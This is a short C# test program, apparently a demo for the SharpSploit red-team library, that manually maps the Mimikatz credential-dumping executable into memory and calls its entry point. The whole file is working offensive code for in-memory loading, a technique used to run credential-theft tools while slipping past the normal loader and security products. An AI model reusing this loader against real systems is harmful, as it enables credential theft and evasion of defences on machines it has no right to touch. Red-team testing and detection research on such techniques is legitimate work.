using System;

namespace SpTestcase
{
    class Program
    {
        static void Main(string[] args)
        {
            // Details
            String testDetail = @"
            #=================>
            # Hello there!
            # I manually map a PE into memory &
            # start a thread at the AddressOfEntryPoint
            #=================>
            ";
            Console.WriteLine(testDetail);

            // Manually map PE into memory
            // |-> byte[] overload is also available for in-line loading
            SharpSploit.Execution.PE.PE_MANUAL_MAP ManMap = SharpSploit.Execution.DynamicInvoke.Generic.MapModuleToMemory(@"C:\Users\b33f\Tools\Mimikatz\x64\mimikatz.exe");
            Console.WriteLine("[?] PE mapped at     : " + String.Format("{0:X}", (ManMap.ModuleBase).ToInt64()));
            if (ManMap.PEINFO.Is32Bit)
            {
                Console.WriteLine("[+] Mapped module is : x86");
            } else
            {
                Console.WriteLine("[+] Mapped module is : x64");
            }

            // Call the executable by it's entry point
            Console.WriteLine("\n[*] Calling mapped module by it's EP..\n");
            SharpSploit.Execution.DynamicInvoke.Generic.CallMappedPEModule(ManMap.PEINFO, ManMap.ModuleBase);

            // Keep the main thread running..
            while (true)
            {
                System.Threading.Thread.Sleep(2000);
            }
        }
    }
}
